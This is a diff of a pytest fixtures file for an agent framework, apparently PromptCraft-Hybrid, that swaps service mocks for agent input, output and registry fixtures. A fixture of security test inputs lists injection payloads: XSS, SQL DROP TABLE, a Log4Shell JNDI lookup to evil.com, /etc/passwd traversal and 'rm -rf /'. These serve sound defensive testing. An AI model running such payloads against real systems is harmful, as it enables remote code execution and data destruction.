@@ -1,342 +1,340 @@
-"""Comprehensive fixture library for PromptCraft testing infrastructure.
+"""
+Common test fixtures for PromptCraft-Hybrid tests.
 
-This module provides reusable fixtures for all test types including:
-- Mock ZenClient and ApplicationSettings
-- Service mocking for external dependencies (Qdrant, Redis)
-- Sample data for CREATE framework testing
-- Configuration validation fixtures
+This module provides shared fixtures for all test modules, following the
+testing guide requirements for reusable setup and teardown logic.
 """
 
-import asyncio
-import json
 import time
-from pathlib import Path
-from unittest.mock import AsyncMock, Mock, patch
+from datetime import UTC, datetime
+from typing import Any
+from unittest.mock import AsyncMock, Mock
 
 import pytest
-from pydantic import BaseModel
 
-# Import application components (with fallback for missing modules)
-try:
-    from src.config.validation import ApplicationSettings
-except ImportError:
-    # Create a minimal ApplicationSettings for testing if module doesn't exist
-    class ApplicationSettings(BaseModel):
-        name: str = "test-app"
-        environment: str = "test"
-        debug: bool = True
-
-
-@pytest.fixture(scope="session")
-def event_loop():
-    """Create an instance of the default event loop for the test session."""
-    loop = asyncio.get_event_loop_policy().new_event_loop()
-    yield loop
-    loop.close()
+from src.agents.base_agent import BaseAgent
+from src.agents.models import AgentConfig, AgentInput, AgentOutput
+from src.agents.registry import AgentRegistry
 
 
 @pytest.fixture
-def mock_zen_client():
-    """Mock ZenClient for testing MCP integrations."""
-    with patch("src.agents.create_agent.ZenClient") as mock_client:
-        # Configure mock client behavior
-        mock_instance = Mock()
-        mock_instance.process_query = AsyncMock(return_value={"result": "processed", "status": "success"})
-        mock_instance.health_check = AsyncMock(return_value=True)
-        mock_instance.close = AsyncMock()
-
-        mock_client.return_value = mock_instance
-        yield mock_instance
-
-
-@pytest.fixture
-def sample_application_settings():
-    """Sample ApplicationSettings for testing."""
-    return ApplicationSettings(name="test-promptcraft", environment="test", debug=True)
-
-
-@pytest.fixture
-def mock_qdrant_client():
-    """Mock Qdrant client for testing vector operations."""
-    with patch("src.core.vector_store.QdrantClient") as mock_client:
-        # Configure mock Qdrant behavior
-        mock_instance = Mock()
-        mock_instance.search = AsyncMock(
-            return_value=[{"id": "test-doc-1", "score": 0.95, "payload": {"content": "Test document content"}}],
-        )
-        mock_instance.upsert = AsyncMock(return_value={"status": "acknowledged"})
-        mock_instance.get_collection_info = AsyncMock(return_value={"status": "green", "vectors_count": 100})
-
-        mock_client.return_value = mock_instance
-        yield mock_instance
-
-
-@pytest.fixture
-def mock_redis_client():
-    """Mock Redis client for testing caching operations."""
-    with patch("redis.Redis") as mock_redis:
-        # Configure mock Redis behavior
-        mock_instance = Mock()
-        mock_instance.get = Mock(return_value=None)
-        mock_instance.set = Mock(return_value=True)
-        mock_instance.delete = Mock(return_value=1)
-        mock_instance.exists = Mock(return_value=False)
-        mock_instance.ping = Mock(return_value=True)
-
-        mock_redis.return_value = mock_instance
-        yield mock_instance
-
-
-@pytest.fixture
-def sample_create_request():
-    """Sample CREATE framework request for testing."""
-    return {
-        "context": "You are an AI assistant helping with software development",
-        "request": "Generate a Python function that calculates factorial",
-        "examples": [
-            {
-                "input": "factorial(5)",
-                "output": "def factorial(n):\n    if n <= 1:\n        return 1\n    return n * factorial(n-1)",
-            },
-        ],
-        "augmentations": ["Include proper error handling", "Add type hints", "Include docstring"],
-        "tone_format": {"style": "professional", "format": "python_function"},
-        "evaluation": {"criteria": ["correctness", "efficiency", "readability"]},
-    }
-
-
-@pytest.fixture
-def sample_create_response():
-    """Sample CREATE framework response for testing."""
-    return {
-        "generated_content": """def factorial(n: int) -> int:
-    \"\"\"Calculate the factorial of a positive integer.
-
-    Args:
-        n: A positive integer
-
-    Returns:
-        The factorial of n
-
-    Raises:
-        ValueError: If n is negative
-    \"\"\"
-    if n < 0:
-        raise ValueError("Factorial is not defined for negative numbers")
-    if n <= 1:
-        return 1
-    return n * factorial(n-1)""",
-        "metadata": {"model_used": "test-model", "tokens_used": 150, "processing_time": 1.2},
-        "evaluation_results": {"correctness": 0.95, "efficiency": 0.88, "readability": 0.92},
-    }
-
-
-@pytest.fixture
-def mock_mcp_server():
-    """Mock MCP server for testing integrations."""
-    mock_server = Mock()
-    mock_server.start = AsyncMock()
-    mock_server.stop = AsyncMock()
-    mock_server.is_running = Mock(return_value=True)
-    mock_server.health_check = AsyncMock(return_value={"status": "healthy"})
-
-    return mock_server
-
-
-@pytest.fixture
-def sample_agent_config():
+def sample_agent_config() -> dict[str, Any]:
     """Sample agent configuration for testing."""
     return {
         "agent_id": "test_agent",
         "name": "Test Agent",
         "description": "A test agent for unit testing",
-        "capabilities": ["text_generation", "code_analysis"],
-        "models": ["test-model-1", "test-model-2"],
-        "max_retries": 3,
+        "max_tokens": 1000,
+        "temperature": 0.7,
         "timeout": 30.0,
+        "enabled": True,
     }
 
 
 @pytest.fixture
-def mock_azure_client():
-    """Mock Azure AI client for testing cloud integrations."""
-    with patch("src.utils.azure_client.AzureAIClient") as mock_client:
-        mock_instance = Mock()
-        mock_instance.generate_completion = AsyncMock(
-            return_value={"content": "Test completion", "usage": {"prompt_tokens": 10, "completion_tokens": 20}},
-        )
-        mock_instance.get_embeddings = AsyncMock(return_value=[0.1, 0.2, 0.3])
-
-        mock_client.return_value = mock_instance
-        yield mock_instance
+def sample_agent_input() -> AgentInput:
+    """Sample AgentInput for testing."""
+    return AgentInput(
+        content="This is a test input for the agent",
+        context={"language": "python", "framework": "fastapi", "operation": "analyze"},
+        config_overrides={"max_tokens": 500, "temperature": 0.5},
+    )
 
 
 @pytest.fixture
-def temp_config_file(tmp_path: Path):
-    """Create a temporary configuration file for testing."""
-    config_content = {
-        "app_name": "test-promptcraft",
-        "environment": "test",
-        "debug": True,
-        "database": {"url": "redis://localhost:6379/0"},
-        "vector_store": {"url": "http://localhost:6333", "collection_name": "test_collection"},
-    }
-
-    config_file = tmp_path / "test_config.json"
-    config_file.write_text(json.dumps(config_content, indent=2))
-    return config_file
+def sample_agent_output() -> AgentOutput:
+    """Sample AgentOutput for testing."""
+    return AgentOutput(
+        content="This is a test output from the agent",
+        metadata={"analysis_type": "security", "issues_found": 0, "confidence_score": 0.95},
+        confidence=0.95,
+        processing_time=1.234,
+        agent_id="test_agent",
+        request_id="test-request-123",
+    )
 
 
 @pytest.fixture
-def mock_file_operations():
-    """Mock file operations for testing."""
-    with (
-        patch("pathlib.Path.exists") as mock_exists,
-        patch("pathlib.Path.read_text") as mock_read,
-        patch("pathlib.Path.write_text") as mock_write,
-    ):
-
-        mock_exists.return_value = True
-        mock_read.return_value = '{"test": "content"}'
-        mock_write.return_value = None
-
-        yield {"exists": mock_exists, "read_text": mock_read, "write_text": mock_write}
+def sample_agent_config_model() -> AgentConfig:
+    """Sample AgentConfig model for testing."""
+    return AgentConfig(
+        agent_id="test_agent",
+        name="Test Agent",
+        description="A test agent for unit testing",
+        config={"max_tokens": 1000, "temperature": 0.7, "timeout": 30.0},
+        enabled=True,
+    )
 
 
 @pytest.fixture
-def sample_knowledge_document():
-    """Sample knowledge document for testing knowledge processing."""
+def mock_base_agent() -> Mock:
+    """Mock BaseAgent for testing without implementation."""
+    mock_agent = Mock(spec=BaseAgent)
+    mock_agent.agent_id = "test_agent"
+    mock_agent.config = {"agent_id": "test_agent"}
+    mock_agent.logger = Mock()
+    mock_agent._initialized = True
+
+    # Mock async methods
+    mock_agent.execute = AsyncMock(
+        return_value=AgentOutput(
+            content="Mocked agent response",
+            metadata={"mocked": True},
+            confidence=0.9,
+            processing_time=0.1,
+            agent_id="test_agent",
+        ),
+    )
+
+    mock_agent.process = AsyncMock(
+        return_value=AgentOutput(
+            content="Mocked agent response",
+            metadata={"mocked": True},
+            confidence=0.9,
+            processing_time=0.1,
+            agent_id="test_agent",
+        ),
+    )
+
+    return mock_agent
+
+
+@pytest.fixture
+def fresh_agent_registry() -> AgentRegistry:
+    """Fresh AgentRegistry instance for testing."""
+    registry = AgentRegistry()
+    yield registry
+    # Cleanup after test
+    registry.clear()
+
+
+@pytest.fixture
+def mock_agent_class():
+    """Mock agent class for registry testing."""
+
+    class MockAgent(BaseAgent):
+        def __init__(self, config: dict[str, Any]):
+            super().__init__(config)
+
+        async def execute(self, agent_input: AgentInput) -> AgentOutput:
+            return AgentOutput(
+                content="Mock response",
+                metadata={"mock": True},
+                confidence=0.9,
+                processing_time=0.1,
+                agent_id=self.agent_id,
+            )
+
+        def get_capabilities(self) -> dict[str, Any]:
+            return {"input_types": ["text"], "output_types": ["text"], "mock_agent": True}
+
+    return MockAgent
+
+
+@pytest.fixture
+def multiple_agent_inputs() -> list[AgentInput]:
+    """Multiple AgentInput instances for batch testing."""
+    return [
+        AgentInput(content="First test input", context={"batch_id": 1}),
+        AgentInput(content="Second test input", context={"batch_id": 2}),
+        AgentInput(content="Third test input", context={"batch_id": 3}),
+    ]
+
+
+@pytest.fixture
+def invalid_agent_configs() -> list[dict[str, Any]]:
+    """Invalid agent configurations for testing validation."""
+    return [
+        {},  # Missing agent_id
+        {"agent_id": ""},  # Empty agent_id
+        {"agent_id": "test-agent"},  # Invalid format (dash instead of underscore)
+        {"agent_id": "test_agent", "name": ""},  # Empty name
+        {"agent_id": "test_agent", "name": "Test", "description": ""},  # Empty description
+        {"agent_id": "test_agent", "name": "Test", "description": "Test", "enabled": "not_boolean"},  # Invalid boolean
+    ]
+
+
+@pytest.fixture
+def mock_logger():
+    """Mock logger for testing logging behavior."""
+    mock_logger = Mock()
+    mock_logger.info = Mock()
+    mock_logger.error = Mock()
+    mock_logger.warning = Mock()
+    mock_logger.debug = Mock()
+    return mock_logger
+
+
+@pytest.fixture
+def timestamp_fixture():
+    """Fixed timestamp for testing."""
+    return datetime(2024, 1, 1, 12, 0, 0, tzinfo=UTC)
+
+
+@pytest.fixture
+def long_text_content() -> str:
+    """Long text content for testing limits."""
+    return "This is a test sentence. " * 1000  # 25,000 characters
+
+
+@pytest.fixture
+def edge_case_strings() -> list[str]:
+    """Edge case strings for testing validation."""
+    return [
+        "",  # Empty string
+        "   ",  # Whitespace only
+        "a",  # Single character
+        "a" * 100000,  # Very long string
+        "Hello\nWorld",  # With newlines
+        "Hello\tWorld",  # With tabs
+        "Hello 🌍 World",  # With emojis
+        "Hello\x00World",  # With null character
+        "Hello\r\nWorld",  # With CRLF
+        "Hello\\nWorld",  # With escaped newline
+    ]
+
+
+@pytest.fixture
+def sample_metadata() -> dict[str, Any]:
+    """Sample metadata for testing."""
     return {
-        "title": "Test Knowledge Document",
-        "version": "1.0",
-        "status": "published",
-        "agent_id": "test_agent",
-        "tags": ["testing", "sample"],
-        "purpose": "Test document for unit testing.",
-        "content": """# Test Knowledge Document
-
-## Overview
-
-This is a test knowledge document for validating the knowledge processing pipeline.
-
-### Key Concepts
-
-- Concept A: Description of concept A
-- Concept B: Description of concept B
-
-### Implementation Details
-
-Implementation details would go here.""",
-        "metadata": {
-            "created_at": "2025-01-01T00:00:00Z",
-            "updated_at": "2025-01-01T00:00:00Z",
-            "word_count": 45,
-            "complexity_score": 0.3,
-        },
+        "analysis_type": "security",
+        "rules_checked": 15,
+        "issues_found": 2,
+        "confidence_score": 0.87,
+        "processing_steps": ["validation", "analysis", "reporting"],
+        "timestamps": {"start": "2024-01-01T12:00:00Z", "end": "2024-01-01T12:00:05Z"},
     }
 
 
 @pytest.fixture
-def mock_gradio_interface():
-    """Mock Gradio interface for testing UI components."""
-    mock_interface = Mock()
-    mock_interface.launch = Mock()
-    mock_interface.close = Mock()
-    mock_interface.queue = Mock(return_value=mock_interface)
-
-    return mock_interface
-
-
-@pytest.fixture(autouse=True)
-def isolate_environment_variables(monkeypatch):
-    """Automatically isolate environment variables for each test."""
-    # Clear potentially problematic environment variables
-    test_env_vars = {
-        "CODECOV_TOKEN": None,
-        "QDRANT_URL": "http://localhost:6333",
-        "REDIS_URL": "redis://localhost:6379/0",
-        "AZURE_API_KEY": "test-key",
-        "ENVIRONMENT": "test",
-    }
-
-    for key, value in test_env_vars.items():
-        if value is None:
-            monkeypatch.delenv(key, raising=False)
-        else:
-            monkeypatch.setenv(key, value)
+def agent_error_contexts() -> list[dict[str, Any]]:
+    """Sample error contexts for testing exception handling."""
+    return [
+        {"error_type": "validation", "field": "content", "value": "", "constraint": "min_length"},
+        {"error_type": "execution", "step": "analysis", "timeout": 30.0, "processing_time": 31.5},
+        {"error_type": "configuration", "parameter": "max_tokens", "value": -1, "constraint": "positive_integer"},
+    ]
 
 
+# Async fixture for testing async operations
 @pytest.fixture
-def error_simulation():
-    """Fixture for simulating various error conditions."""
+async def async_agent_execution():
+    """Async fixture for testing agent execution."""
+
+    async def execute_agent(agent, agent_input):
+        return await agent.process(agent_input)
+
+    return execute_agent
+
+
+# Performance testing fixtures
+@pytest.fixture
+def performance_test_data():
+    """Data for performance testing."""
     return {
-        "network_error": Exception("Network connection failed"),
-        "timeout_error": TimeoutError("Request timed out"),
-        "validation_error": ValueError("Invalid input provided"),
-        "auth_error": PermissionError("Authentication failed"),
-        "service_unavailable": ConnectionError("Service unavailable"),
+        "small_input": "Short test input",
+        "medium_input": "Medium test input. " * 100,
+        "large_input": "Large test input. " * 10000,
+        "expected_processing_times": {"small": 0.1, "medium": 1.0, "large": 10.0},
     }
+
+
+# Security testing fixtures
+@pytest.fixture
+def security_test_inputs():
+    """Security test inputs for testing injection attacks."""
+    return [
+        "<script>alert('xss')</script>",
+        "'; DROP TABLE users; --",
+        "{{7*7}}",
+        "${jndi:ldap://evil.com/a}",
+        "../../../../etc/passwd",
+        "javascript:alert('xss')",
+        "data:text/html,<script>alert('xss')</script>",
+        "\x00\x01\x02\x03\x04\x05",  # Binary data
+        "eval('alert(1)')",
+        "import os; os.system('rm -rf /')",
+    ]
+
+
+@pytest.fixture(scope="session")
+def test_database_url():
+    """Database URL for integration testing."""
+    return "sqlite:///:memory:"
+
+
+@pytest.fixture
+def cleanup_after_test():
+    """Fixture to ensure cleanup after tests."""
+    return
+    # Cleanup code here if needed
 
 
 @pytest.fixture
 def performance_metrics():
-    """Fixture providing performance measurement utilities."""
+    """Performance metrics fixture for testing."""
 
-    class PerformanceTracker:
+    class PerformanceMetrics:
         def __init__(self):
-            self.start_time = None
-            self.end_time = None
+            self.start_time = 0.0
+            self.end_time = 0.0
+            self.processing_time = 0.0
 
         def start(self):
-            self.start_time = time.perf_counter()
+            self.start_time = time.time()
 
         def stop(self):
-            self.end_time = time.perf_counter()
+            self.end_time = time.time()
+            self.processing_time = self.end_time - self.start_time
 
-        @property
-        def elapsed(self) -> float:
-            if self.start_time and self.end_time:
-                return self.end_time - self.start_time
-            return 0.0
+        def assert_max_duration(self, max_duration):
+            assert (
+                self.processing_time <= max_duration
+            ), f"Processing time {self.processing_time} exceeded maximum {max_duration}"
 
-        def assert_max_duration(self, max_seconds: float):
-            assert self.elapsed <= max_seconds, f"Operation took {self.elapsed:.3f}s, expected <= {max_seconds}s"
-
-    return PerformanceTracker()
-
-
-# Parametrized fixtures for edge case testing
+    return PerformanceMetrics()
 
 
 @pytest.fixture(
     params=[
-        "",  # Empty string
-        "a" * 10000,  # Very long string
-        "🚀🔥💯",  # Unicode/emoji
-        "\x00\x01\x02",  # Binary data
-        None,  # None value
-        {"nested": {"data": "test"}},  # Complex nested data
-    ],
-)
-def edge_case_inputs(request):
-    """Parametrized fixture providing various edge case inputs."""
-    return request.param
-
-
-@pytest.fixture(
-    params=[
+        {"invalid": "config"},
+        {},
+        None,
+        [],
+        "string_config",
+        123,
+        {"app_name": ""},
+        {"app_name": None},
+        {"app_name": "a" * 1000},
+        {"app_name": "\x00\x01"},
+        {"app_name": "🚀🔥💯"},
+        {"environment": "dev"},
         {"valid": "config"},
-        {},  # Empty config
-        None,  # None config
-        {"invalid": "structure", "missing": "required_fields"},
     ],
 )
 def config_edge_cases(request):
-    """Parametrized fixture for configuration validation edge cases."""
+    """Parametrized fixture for configuration edge cases."""
     return request.param
 
 
-@pytest.fixture(params=[1, 10, 100, 1000])
-def load_test_sizes(request):
-    """Parametrized fixture for load testing with different sizes."""
+@pytest.fixture(
+    params=[
+        None,
+        "",
+        "a",
+        "a" * 100,
+        "a" * 1000,
+        "a" * 10000,
+        "\x00\x01",
+        "🚀🔥💯",
+        "\n\r\t",
+        "normal input",
+        123,
+        [],
+        {},
+    ],
+)
+def edge_case_inputs(request):
+    """Parametrized fixture for edge case inputs."""
     return request.param
